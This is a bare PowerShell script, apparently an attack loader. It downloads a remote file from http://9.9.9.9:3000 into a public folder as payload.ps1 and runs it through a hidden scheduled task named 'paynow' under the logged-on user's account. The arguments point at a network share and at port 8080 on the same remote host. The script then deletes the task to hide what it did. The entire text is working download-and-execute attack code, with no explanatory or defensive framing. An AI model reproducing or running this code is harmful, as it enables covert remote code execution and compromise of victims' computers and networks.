((Get-WMIObject -ClassName Win32_ComputerSystem).Username | Out-String)
Invoke-WebRequest -useb http://9.9.9.9:3000/frsm.ps1 -Outfile c:\users\public\documents\payload.ps1
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NonInteractive -NoLogo -NoProfile -WindowStyle hidden -File "c:\users\public\documents\payload.ps1" -se \\192.168.1.19\share -s 9.9.9.9 -p 8080 -x -full'
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId ((Get-WMIObject -ClassName Win32_ComputerSystem).Username | Out-String)
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
 Register-ScheduledTask paynow -InputObject $task
 Start-ScheduledTask -TaskName paynow
 Start-Sleep -Seconds 5
 Unregister-ScheduledTask -TaskName paynow -Confirm:$false